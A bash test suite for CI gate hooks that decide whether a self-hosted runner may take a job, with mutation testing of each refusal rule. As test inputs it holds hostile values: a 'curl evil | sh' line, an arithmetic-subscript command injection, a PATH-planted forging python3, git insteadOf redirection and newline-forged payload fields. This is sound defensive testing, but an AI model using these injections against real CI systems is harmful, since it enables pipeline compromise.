#!/usr/bin/env bash
# Shell test for gate-job-started.sh / gate-job-completed.sh (CI offload stage 3 + wave 0).
#   bash docs/ci-offload/acer-web/test-gate-hooks.sh            -> "PASS n cases", exit 0
#   HOOK_STARTED=/path/mutant.sh bash ...test-gate-hooks.sh     -> run against a hook mutant
#   bash docs/ci-offload/acer-web/test-gate-hooks.sh --mutants  -> one mutant per `#@rule` line of
#       the started hook (its `refuse` becomes `true`), plus `scrub_env` (its call deleted);
#       every mutant must make this suite FAIL.
#   FAST=1: skip the slow lock-holder timing cases (used by --mutants).
# Needs git, flock, setsid (util-linux), python3. Uses only a temp dir and a local file:// remote.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
STARTED=${HOOK_STARTED:-$HERE/gate-job-started.sh}
COMPLETED=${HOOK_COMPLETED:-$HERE/gate-job-completed.sh}

if [ "${1:-}" = "--mutants" ]; then
  M=$(mktemp -d); trap 'rm -rf "$M"' EXIT
  rules=$(grep -o '#@rule [a-z0-9-]*' "$HERE/gate-job-started.sh" | awk '{print $2}')
  [ -n "$rules" ] || { echo "FAIL no #@rule lines found"; exit 1; }
  mf=0; mn=0
  for r in $rules; do
    mn=$((mn+1))
    awk -v tag="#@rule $r" '{ if (index($0, tag)) { gsub(/refuse /, "true ") } print }' "$HERE/gate-job-started.sh" > "$M/$r.sh"
    if cmp -s "$M/$r.sh" "$HERE/gate-job-started.sh"; then echo "FAIL mutant $r: no change made"; mf=$((mf+1)); continue; fi
    if FAST=1 HOOK_STARTED="$M/$r.sh" bash "$0" > "$M/$r.out" 2>&1; then
      echo "FAIL mutant $r SURVIVED (suite still passes with the rule removed)"; mf=$((mf+1))
    else
      echo "ok   mutant $r caught by: $(grep -m1 '^FAIL ' "$M/$r.out" | cut -c6-80)"
    fi
  done
  # scrub_env mutant: the hook keeps the inherited PATH and GIT_* env.
  mn=$((mn+1)); grep -v '^scrub_env$' "$HERE/gate-job-started.sh" > "$M/scrub.sh"
  if cmp -s "$M/scrub.sh" "$HERE/gate-job-started.sh"; then echo "FAIL mutant scrub_env: no change made"; mf=$((mf+1))
  elif FAST=1 HOOK_STARTED="$M/scrub.sh" bash "$0" > "$M/scrub.out" 2>&1; then
    echo "FAIL mutant scrub_env SURVIVED"; mf=$((mf+1))
  else
    echo "ok   mutant scrub_env caught by: $(grep -m1 '^FAIL ' "$M/scrub.out" | cut -c6-80)"
  fi
  if [ "$mf" -gt 0 ]; then echo "FAIL $mf of $mn mutants survived"; exit 1; fi
  echo "PASS all $mn mutants caught"; exit 0
fi

T=$(mktemp -d); trap 'pkill -P $$ 2>/dev/null; [ -n "${W:-}" ] && kill "$W" 2>/dev/null; rm -rf "$T"' EXIT
fail=0; n=0
check() { n=$((n+1)); if [ "$2" = "$3" ]; then echo "ok   $1"; else echo "FAIL $1: expected $3, got $2"; fail=$((fail+1)); fi; }
g() { git -c user.email=t@t -c user.name=t -c init.defaultBranch=main "$@"; }
sha() { g -C "$T/src" rev-parse "$1"; }

# ---- origin ----------------------------------------------------------------------------------
# main: two allow-listed workflows. Each PR = a branch off main + a merge commit (parents: main,
# head), the shape GitHub's refs/pull/N/merge has. main itself never moves.
g init -q "$T/src"; mkdir -p "$T/src/.github/workflows" "$T/src/scripts/ci"
printf 'name: BOM Check\njobs: {}\n' > "$T/src/.github/workflows/bom-check.yml"
printf 'name: Lint\njobs: {}\n' > "$T/src/.github/workflows/lint.yml"
echo base > "$T/src/scripts/ci/route.mjs"
g -C "$T/src" add -A; g -C "$T/src" commit -qm main; MAIN=$(sha main)
pr() { # pr <name> <file> <content> -> sets HEAD_<name> and MERGE_<name>
  g -C "$T/src" checkout -q -b "h-$1" main
  mkdir -p "$(dirname "$T/src/$2")"; printf '%s\n' "$3" > "$T/src/$2"
  g -C "$T/src" add -A; g -C "$T/src" commit -qm "$1"
  eval "HEAD_$1=$(sha HEAD)"
  g -C "$T/src" checkout -q -b "m-$1" main; g -C "$T/src" merge -q --no-ff --no-edit "h-$1"
  eval "MERGE_$1=$(sha HEAD)"
  g -C "$T/src" checkout -q main
}
pr same a.txt x
pr mut .github/workflows/bom-check.yml 'jobs: { evil: { runs-on: acer-web } }'
pr prot scripts/ci/route.mjs evil
pr lib scripts/library.mjs fine
# protected-each-prefix: one PR per PROTECTED entry. Non-ASCII / control-char names are written
# with printf escapes (no pasted characters): git C-quotes them without -z (protected-nonascii).
pr pgh .github/CODEOWNERS '* @x'
pr pci scripts/ci/new.mjs x
pr plib scripts/lib/util.mjs x
pr ppkg package.json '{}'
pr plock package-lock.json '{}'
pr nonascii "scripts/ci/$(printf '\303\251').mjs" x
pr nonasciiwf ".github/workflows/$(printf '\303\251').yml" 'jobs: {}'
pr ctrl "scripts/lib/$(printf 'a\tb').mjs" x
g clone -q --bare "$T/src" "$T/origin.git"; g -C "$T/origin.git" config uploadpack.allowAnySHA1InWant true
# git-env-pollution: an "evil" origin whose main carries the altered workflow. If GIT_CONFIG_*
# insteadOf could redirect the hook's fetch here, the altered blob would match "main".
g clone -q --bare "$T/src" "$T/evil.git"; g -C "$T/evil.git" config uploadpack.allowAnySHA1InWant true
g -C "$T/evil.git" update-ref refs/heads/main "$MERGE_mut"
# PATH pollution: a fake python3 that forges a trusted payload.
mkdir -p "$T/fakebin"; printf '#!/bin/sh\nprintf "P_KIND=pull_request\\nP_REPO=o/r\\nP_SENDER=kiki-claude-bot\\nP_AUTHOR=kiki-claude-bot\\nP_HEAD_REPO=o/r\\nP_HEAD_SHA=%%s\\nP_BASE_REF=main\\n" "$FAKE_HEAD"\n' > "$T/fakebin/python3"; chmod +x "$T/fakebin/python3"

ALLOW_BODY='# reviewed allow-list
.github/workflows/bom-check.yml
.github/workflows/lint.yml   # trailing comment'
printf '%s\n' "$ALLOW_BODY" > "$T/workflows.allow"
cat > "$T/gate.conf" <<CONF
REPO=o/r
TRUSTED=kiki-claude-bot 123constante
ALLOW_FILE=$T/workflows.allow
REMOTE_URL=file://$T/origin.git
TEST_FILE_PROTOCOL=1
MAIN_REF=refs/heads/main
STATE_DIR=$T/state
WORK_DIR=$T/work
WALK_LOCK=$T/walk.lock
CONF
EV=$T/work/_temp/_github_workflow/event.json
sleep 600 & W=$!

reset() { rm -rf "$T/state" "$T/work" "$T/evil"; mkdir -p "$T/state" "$T/work/_tool" "$T/work/_actions" "$T/work/_temp/_github_workflow" "$T/work/_PipelineMapping" "$T/work/r/r"; }
# payload KEY=VAL...: write the runner's event.json. kind=pr|push|other; defaults = a trusted same-repo PR.
payload() {
  local kind=pr repo=o/r sender=kiki-claude-bot author=kiki-claude-bot head_repo=o/r head_sha=$HEAD_same base=main ref=refs/heads/main after=$MAIN out=$EV a
  for a in "$@"; do local "$a"; done
  case "$kind" in
    pr) printf '{"action":"synchronize","number":1,"repository":{"full_name":"%s"},"sender":{"login":"%s"},"pull_request":{"user":{"login":"%s"},"base":{"ref":"%s"},"head":{"sha":"%s","repo":{"full_name":"%s"}}}}\n' \
          "$repo" "$sender" "$author" "$base" "$head_sha" "$head_repo" > "$out" ;;
    push) printf '{"ref":"%s","before":"%s","after":"%s","pusher":{"name":"x"},"repository":{"full_name":"%s"},"sender":{"login":"%s"}}\n' \
          "$ref" "$MAIN" "$after" "$repo" "$sender" > "$out" ;;
    *) printf '{"issue":{"number":1},"repository":{"full_name":"%s"},"sender":{"login":"%s"}}\n' "$repo" "$sender" > "$out" ;;
  esac
}
run() { # env overrides as args; prints exit code. Defaults = PR "same" on bom-check.yml.
  env -i PATH="$PATH" HOME="$T" GITHUB_RUN_ID=9 GITHUB_RUN_ATTEMPT=1 GITHUB_JOB=bom-check-routed \
    GITHUB_REPOSITORY=o/r GITHUB_EVENT_NAME=pull_request GITHUB_REF=refs/pull/1/merge GITHUB_EVENT_PATH="$EV" \
    GITHUB_ACTOR=kiki-claude-bot GITHUB_TRIGGERING_ACTOR=kiki-claude-bot \
    GITHUB_WORKFLOW_REF="o/r/.github/workflows/bom-check.yml@refs/pull/1/merge" GITHUB_WORKFLOW_SHA="$MERGE_same" \
    WEB_RUNNER_STATE_DIR=/nonexistent WEB_RUNNER_GATE_FILE="$T/evil" WEB_RUNNER_WORK_DIR=/nonexistent WALK_LOCK=/nonexistent \
    SAFE_LOAD_MAX=999 SAFE_MEM_MIN=0 GATE_WAIT_S=0 WEB_RUNNER_WATCH_PID="$W" "$@" \
    bash "$STARTED" --conf "$T/gate.conf" >"$T/out" 2>&1; echo $?
}
word() { awk '{print $4}' "$T/state/gate-verdict" 2>/dev/null; }
lockfree() { ( flock -n 9 && echo free || echo held ) 9>>"$T/walk.lock"; }
done_hook() { env -i PATH="$PATH" GITHUB_REPOSITORY=o/r WEB_RUNNER_STATE_DIR=/nonexistent WEB_RUNNER_WORK_DIR=/nonexistent bash "$COMPLETED" --conf "$T/gate.conf"; echo $?; }
waitfree() { for _ in $(seq 1 50); do [ "$(lockfree)" = free ] && break; sleep 0.1; done; lockfree; }
says() { grep -qF -- "$1" "$T/out" && echo yes || echo "no ($(grep -m1 'side-machine gate' "$T/out" | cut -c1-120))"; }
# refused <name> <reason substring> [payload KEY=VAL ...] -- [env KEY=VAL ...]: exit 1, names the reason, lock untouched.
refused() {
  local name=$1 why=$2; shift 2; local pl=() a
  while [ $# -gt 0 ] && [ "$1" != -- ]; do pl+=("$1"); shift; done; [ "${1:-}" = -- ] && shift
  reset; payload "${pl[@]}"
  check "$name: refused (exit 1)" "$(run "$@")" 1
  check "$name: names the reason" "$(says "$why")" yes
}
accepted() {
  local name=$1; shift; local pl=() a
  while [ $# -gt 0 ] && [ "$1" != -- ]; do pl+=("$1"); shift; done; [ "${1:-}" = -- ] && shift
  reset; payload "${pl[@]}"
  check "$name: ok (exit 0)" "$(run "$@")" 0
  check "$name: verdict ok" "$(word)" ok
  done_hook >/dev/null; waitfree >/dev/null
}

# ---- 0. rule lists agree with scripts/ci/route-runner.mjs (one source of truth, mirrored) -----
RR=$HERE/../../../scripts/ci/route-runner.mjs
arr() { grep -E "^export const $1 = \[" "$RR" | sed -E "s/.*\[(.*)\].*/\1/; s/[',]/ /g" | xargs; }
hook() { grep -E "^$1=" "$HERE/gate-job-started.sh" | head -1 | sed -E 's/^[A-Z_]+="?([^"]*)"?.*/\1/' | xargs; }
check 'TRUSTED in the hook == TRUSTED_AUTHORS in route-runner.mjs' "$(hook G_TRUSTED)" "$(arr TRUSTED_AUTHORS)"
check 'PROTECTED in the hook == PROTECTED_PREFIXES in route-runner.mjs' "$(hook G_PROTECTED)" "$(arr PROTECTED_PREFIXES)"
check 'route-runner.mjs lists were read' "$([ -n "$(arr TRUSTED_AUTHORS)" ] && [ -n "$(arr PROTECTED_PREFIXES)" ] && echo yes)" yes
# tr -d: the repo checks this file out with CRLF (.gitattributes); the hook strips the CR too.
check 'workflows.allow in the repo: default = bom-check.yml only' "$(tr -d '\r' < "$HERE/workflows.allow" | grep -vE '^[[:space:]]*(#|$)' | xargs)" .github/workflows/bom-check.yml

# ---- 1. accept: identical listed workflow, cleanup, completed hook ----------------------------
reset; payload; touch -d '2 hours ago' "$T/work/_temp/old"; touch "$T/work/_temp/new"; mkdir "$T/work/stale-checkout"
mkdir -p "$T/work/_home/.npm" "$T/work/_cache/npm"; touch "$T/work/_home/.npmrc" "$T/work/_cache/npm/keep"
check "identical workflow: exit 0" "$(run)" 0
check 'identical workflow: verdict ok' "$(word)" ok
check 'identical workflow: walk lock held' "$(lockfree)" held
check 'started cleanup: stale checkout removed' "$([ -e "$T/work/stale-checkout" ] && echo kept || echo gone)" gone
check 'started cleanup: old _temp entry removed' "$([ -e "$T/work/_temp/old" ] && echo kept || echo gone)" gone
check 'started cleanup: fresh _temp entry kept' "$([ -e "$T/work/_temp/new" ] && echo kept || echo gone)" kept
check 'started cleanup: _tool/_actions kept' "$([ -d "$T/work/_tool" ] && [ -d "$T/work/_actions" ] && echo kept)" kept
check "started cleanup: THIS job's workspace + _PipelineMapping kept" "$([ -d "$T/work/r/r" ] && [ -d "$T/work/_PipelineMapping" ] && echo kept)" kept
check 'started cleanup: _home recreated empty' "$([ -d "$T/work/_home" ] && [ -z "$(ls -A "$T/work/_home")" ] && echo empty)" empty
check 'started cleanup: _cache kept' "$([ -e "$T/work/_cache/npm/keep" ] && echo kept)" kept
check 'env paths ignored: no file written at WEB_RUNNER_GATE_FILE' "$([ -e "$T/evil" ] && echo written || echo none)" none
mkdir -p "$T/work/r/src"
check 'completed: exit 0' "$(done_hook)" 0
check 'completed: lock released' "$(waitfree)" free
check 'completed: checkout contents removed, dir kept' "$([ -e "$T/work/r/r" ] && echo kept || echo gone)/$([ -d "$T/work/r" ] && echo dir)" gone/dir
check 'completed: _temp/_actions/_tool kept' "$([ -d "$T/work/_temp" ] && [ -d "$T/work/_actions" ] && [ -d "$T/work/_tool" ] && echo kept)" kept

# ---- 2. MUTANT: altered workflow blob must be refused ------------------------------------------
# Push-shaped (a pushed commit whose workflow differs from main's current one) so that ONLY the
# blob compare can refuse it; a PR-shaped altered workflow is also caught by the protected-path
# rule (.github/), which would hide a missing identity check.
reset; payload kind=push after="$MERGE_mut"
check 'MUTANT altered workflow: refused (exit 1)' "$(run GITHUB_EVENT_NAME=push GITHUB_REF=refs/heads/main GITHUB_WORKFLOW_SHA="$MERGE_mut")" 1
check 'MUTANT altered workflow: verdict refused' "$(word)" refused
check 'MUTANT altered workflow: names IDENTITY' "$(grep -c IDENTITY "$T/out")" 1
check 'MUTANT altered workflow: lock never taken' "$(lockfree)" free

# ---- 3. accept table ----------------------------------------------------------------------------
accepted 'second listed workflow (lint.yml)' -- GITHUB_WORKFLOW_REF="o/r/.github/workflows/lint.yml@refs/pull/1/merge"
accepted 'push to main' kind=push -- GITHUB_EVENT_NAME=push GITHUB_REF=refs/heads/main GITHUB_WORKFLOW_SHA="$MAIN"
accepted 'PR touching scripts/library.mjs (no over-match on scripts/lib/)' head_sha="$HEAD_lib" -- GITHUB_WORKFLOW_SHA="$MERGE_lib"
accepted 'author/actor case-insensitive' sender=Kiki-Claude-Bot author=KIKI-CLAUDE-BOT
# git-env-pollution (item 2): GIT_* / PATH in the job env never reach git or python3.
accepted 'git-env-pollution: GIT_DIR, GIT_OBJECT_DIRECTORY, GIT_EXEC_PATH set, still ok' -- GIT_DIR="$T/nope.git" GIT_OBJECT_DIRECTORY="$T/nope" GIT_EXEC_PATH="$T/nope" GIT_REPLACE_REF_BASE=refs/x/
reset; payload kind=push after="$MERGE_mut"
check 'git-env-pollution: insteadOf redirect to an evil origin, still refused (exit 1)' "$(run GITHUB_EVENT_NAME=push GITHUB_REF=refs/heads/main GITHUB_WORKFLOW_SHA="$MERGE_mut" GIT_DIR="$T/evil.git" GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0="url.file://$T/evil.git.insteadOf" GIT_CONFIG_VALUE_0="file://$T/origin.git")" 1
check 'git-env-pollution: insteadOf redirect, names IDENTITY' "$(says IDENTITY)" yes
refused 'path-pollution: PATH with a forging python3 is ignored' 'payload sender mallory' sender=mallory -- PATH="$T/fakebin:$PATH" FAKE_HEAD="$HEAD_same"
# allow-list whitespace (item 4): trimmed at the ends, refused inside; CRLF lines ok.
printf ' \t.github/workflows/bom-check.yml \r\n.github/workflows/lint.yml\t# c\r\n' > "$T/workflows.allow"
accepted 'allow-list: leading/trailing whitespace and CRLF trimmed'
printf '%s\n' "$ALLOW_BODY" > "$T/workflows.allow"
# gate-wait-injection (item 7): an arithmetic subscript in GATE_WAIT_S must not run.
accepted 'gate-wait-injection: GATE_WAIT_S expression ignored' -- GATE_WAIT_S='x[$(touch '"$T"'/pwned)]'
check 'gate-wait-injection: no command ran' "$([ -e "$T/pwned" ] && echo ran || echo none)" none

# ---- 4. refusal table: one row per rule (#@rule tag in the hook) ------------------------------
# allow-list file
printf '%s\n' '.github/workflows/../../etc/x.yml' > "$T/workflows.allow"
refused 'allow-malformed: path outside .github/workflows' 'unreadable or malformed'
printf '%s\n' 'bom-check.yml' > "$T/workflows.allow"
refused 'allow-malformed: bare file name' 'unreadable or malformed'
printf '%s\n' .github/workflows/bom-check.yml 'curl evil | sh' > "$T/workflows.allow"
refused 'allow-malformed: one bad line after a good one refuses everything' 'unreadable or malformed'
printf '%s\n' '# nothing listed' > "$T/workflows.allow"
refused 'allow-malformed: empty list refuses everything' 'unreadable or malformed'
printf '%s\n' '.github/workflows/bom check.yml' > "$T/workflows.allow"
refused 'allow-malformed: whitespace inside a name (not read as bomcheck.yml)' 'unreadable or malformed' -- GITHUB_WORKFLOW_REF="o/r/.github/workflows/bomcheck.yml@refs/pull/1/merge"
rm -f "$T/workflows.allow"
accepted 'allow file missing: bom-check.yml still allowed (default)'
refused 'allow file missing: lint.yml not allowed' 'not in the allow-list' -- GITHUB_WORKFLOW_REF="o/r/.github/workflows/lint.yml@refs/pull/1/merge"
printf '%s\n' "$ALLOW_BODY" > "$T/workflows.allow"
# workflow
refused 'workflow-repo: workflow from another repo' 'is not in o/r' -- GITHUB_WORKFLOW_REF='x/r/.github/workflows/bom-check.yml@refs/pull/1/merge'
refused 'workflow-unlisted: evil.yml' 'not in the allow-list' -- GITHUB_WORKFLOW_REF='o/r/.github/workflows/evil.yml@refs/pull/1/merge'
# event source
echo '{"action":"synchronize","number":1,"repository":{"full_name":"o/r"},"sender":{"login":"kiki-claude-bot"},"pull_request":{"user":{"login":"kiki-claude-bot"},"head":{"sha":"'"$HEAD_same"'","repo":{"full_name":"o/r"}}}}' > "$T/fake.json"
refused 'event-path: GITHUB_EVENT_PATH elsewhere is refused, not followed' 'GITHUB_EVENT_PATH' sender=mallory -- GITHUB_EVENT_PATH="$T/fake.json"
reset; payload; rm -f "$EV"
check 'payload-missing: refused (exit 1)' "$(run)" 1
check 'payload-missing: names the reason' "$(says 'missing or unreadable')" yes
reset; echo 'not json' > "$EV"
check 'payload-missing: malformed JSON refused' "$(run)" 1
check 'payload-missing: malformed JSON names the reason' "$(says 'missing or unreadable')" yes
# symlink-event-json: event.json, or its _github_workflow dir, as a symlink is refused, not followed.
reset; ln -s "$T/fake.json" "$EV"
check 'symlink-event-json: file symlink refused' "$(run)" 1
check 'symlink-event-json: file symlink names the reason' "$(says 'missing or unreadable')" yes
reset; rm -rf "$T/work/_temp/_github_workflow"; mkdir -p "$T/elsewhere"; cp "$T/fake.json" "$T/elsewhere/event.json"; ln -s "$T/elsewhere" "$T/work/_temp/_github_workflow"
check 'symlink-event-json: dir symlink refused' "$(run)" 1
check 'symlink-event-json: dir symlink names the reason' "$(says 'missing or unreadable')" yes
# payload-control-char: a newline in a value must not forge a P_SENDER= line.
refused 'payload-control-char: newline in sender' 'control character' 'sender=mallory\nP_SENDER=kiki-claude-bot'
refused 'payload-control-char: newline in head repo' 'control character' 'head_repo=fork/r\nP_HEAD_REPO=o/r'
refused 'event-agree: env pull_request_target, PR-shaped payload' 'is not push/pull_request' -- GITHUB_EVENT_NAME=pull_request_target
refused 'event-agree: env says push, payload is a PR' 'is not push/pull_request' -- GITHUB_EVENT_NAME=push GITHUB_REF=refs/heads/main
refused 'event-kind: payload of another event' 'payload event other' kind=other -- GITHUB_EVENT_NAME=other
refused 'payload-repo: payload from another repo' 'payload repo' repo=x/r
refused 'env-repo: env repo differs' 'repo x/r is not' -- GITHUB_REPOSITORY=x/r
refused 'sender: payload sender untrusted, env actors trusted' 'payload sender mallory' sender=mallory
refused 'env-actor: untrusted actor' 'actor mallory' -- GITHUB_ACTOR=mallory GITHUB_TRIGGERING_ACTOR=mallory
refused 'env-actor: untrusted re-run actor' 'actor mallory' -- GITHUB_TRIGGERING_ACTOR=mallory
refused 'env-actor: env cannot widen the trust list' 'actor mallory' -- GITHUB_ACTOR=mallory GITHUB_TRIGGERING_ACTOR=mallory TRUSTED=mallory G_TRUSTED=mallory
refused 'sha-format: non-hex sha' 'is not a commit sha' -- GITHUB_WORKFLOW_SHA=main
refused 'unknown sha' 'cannot fetch workflow commit' -- GITHUB_WORKFLOW_SHA=0123456789abcdef0123456789abcdef01234567 GITHUB_REF=refs/nope
refused 'push-ref: push to a branch' 'push to refs/heads/x' kind=push ref=refs/heads/x -- GITHUB_EVENT_NAME=push GITHUB_REF=refs/heads/x GITHUB_WORKFLOW_SHA="$MAIN"
refused 'env-ref: env ref disagrees with a push-to-main payload' 'disagrees with the payload' kind=push -- GITHUB_EVENT_NAME=push GITHUB_REF=refs/heads/x GITHUB_WORKFLOW_SHA="$MAIN"
refused 'push-after: workflow sha is not the pushed commit' 'is not the workflow commit' kind=push after="$HEAD_same" -- GITHUB_EVENT_NAME=push GITHUB_REF=refs/heads/main GITHUB_WORKFLOW_SHA="$MAIN"
refused 'head-repo: PR from a fork' 'PR head fork/r' head_repo=fork/r
refused 'pr-author: author untrusted (sender trusted)' 'PR author mallory' author=mallory
refused 'head-sha-format: payload head sha garbage' 'payload head sha' head_sha=abc
refused 'merge-head: workflow sha is not the merge of the payload head' 'is not the merge of PR head' head_sha="$HEAD_prot"
refused 'protected: PR touching scripts/ci/' 'PR touches scripts/ci/route.mjs' head_sha="$HEAD_prot" -- GITHUB_WORKFLOW_SHA="$MERGE_prot"
# protected-each-prefix: one row per PROTECTED entry.
refused 'protected-each-prefix: .github/' 'PR touches .github/CODEOWNERS' head_sha="$HEAD_pgh" -- GITHUB_WORKFLOW_SHA="$MERGE_pgh"
refused 'protected-each-prefix: scripts/ci/' 'PR touches scripts/ci/new.mjs' head_sha="$HEAD_pci" -- GITHUB_WORKFLOW_SHA="$MERGE_pci"
refused 'protected-each-prefix: scripts/lib/' 'PR touches scripts/lib/util.mjs' head_sha="$HEAD_plib" -- GITHUB_WORKFLOW_SHA="$MERGE_plib"
refused 'protected-each-prefix: package.json' 'PR touches package.json' head_sha="$HEAD_ppkg" -- GITHUB_WORKFLOW_SHA="$MERGE_ppkg"
refused 'protected-each-prefix: package-lock.json' 'PR touches package-lock.json' head_sha="$HEAD_plock" -- GITHUB_WORKFLOW_SHA="$MERGE_plock"
# protected-nonascii (item 1): C-quoted names must still match their prefix.
refused 'protected-nonascii: scripts/ci/<e-acute>.mjs' 'PR touches $' head_sha="$HEAD_nonascii" -- GITHUB_WORKFLOW_SHA="$MERGE_nonascii"
check 'protected-nonascii: names scripts/ci/' "$(says 'scripts/ci/')" yes
refused 'protected-nonascii: .github/workflows/<e-acute>.yml' 'PR touches $' head_sha="$HEAD_nonasciiwf" -- GITHUB_WORKFLOW_SHA="$MERGE_nonasciiwf"
refused 'protected-nonascii: tab in a scripts/lib/ name' 'PR touches $' head_sha="$HEAD_ctrl" -- GITHUB_WORKFLOW_SHA="$MERGE_ctrl"
refused 'base-ref: PR into another branch' 'PR base release is not main' base=release
refused 'identity (PR shape): altered listed workflow' 'IDENTITY' head_sha="$HEAD_mut" -- GITHUB_WORKFLOW_SHA="$MERGE_mut"

if [ -z "${FAST:-}" ]; then
# ---- 9. holder exits when the watched (runner) process dies -----------------------------------
reset; payload
sleep 600 & W2=$!
check 'holder: ok' "$(run WEB_RUNNER_WATCH_PID=$W2)" 0
check 'holder: lock held while runner lives' "$(lockfree)" held
kill $W2; wait $W2 2>/dev/null
check 'holder: lock released when the runner dies' "$(sleep 1.5; waitfree)" free
# 9b. runner process already gone -> refused at once, exit 1, lock free
reset; payload
true & W3=$!; wait $W3
check 'runner already gone: exit 1' "$(run WEB_RUNNER_WATCH_PID=$W3)" 1
check 'runner already gone: lock free' "$(waitfree)" free
# 10. holder cap
reset; payload; check 'holder cap: ok' "$(run HOLDER_MAX_S=2)" 0
check 'holder cap: lock released after HOLDER_MAX_S' "$(sleep 3; waitfree)" free
# 11. pid file unwritable -> lock released, exit 1
reset; payload; mkdir "$T/state/lock-holder.pid.tmp"
check 'pid file unwritable: exit 1' "$(run)" 1
check 'pid file unwritable: lock released' "$(waitfree)" free
# 12. walk lock busy -> refused BUSY, exit 0 (busy is not an error)
reset; payload; exec 8>>"$T/walk.lock"; flock -n 8
check 'walk running: exit 0' "$(run)" 0
check 'walk running: verdict refused' "$(word)" refused
exec 8>&-
fi

if [ "$fail" -gt 0 ]; then echo "FAIL $fail of $n"; exit 1; fi
echo "PASS $n cases"
